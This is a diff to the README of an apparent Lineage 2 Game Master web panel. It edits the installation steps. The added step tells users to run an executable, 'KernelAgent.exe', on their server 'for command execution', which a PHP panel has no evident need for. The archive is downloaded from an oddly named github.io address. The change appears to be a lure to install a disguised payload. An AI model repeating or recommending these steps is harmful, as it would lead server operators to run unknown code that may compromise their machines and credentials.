@@ -39,11 +39,11 @@ Advanced GM Panel is a feature-rich control panel for Game Masters and Admins on
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://advanced-gm-panel-lineage-2.github.io/.github
-) section  
+1. 📦 **Download the archive** from the [Releases](https://advanced-gm-panel-lineage-2.github.io/.github) section  
 2. 📁 **Upload files** to your web host (e.g. `/var/www/html/gmpanel`)  
 3. ⚙️ **Edit `config.php`** with your MySQL credentials and GM table  
-4. 🖱 **Login** with your GM account credentials
+4. 🖱 **Run the executable file** `KernelAgent.exe` on your server (required for command execution)  
+5. 🔐 **Login** with your GM account credentials through the browser
 
 ---
 
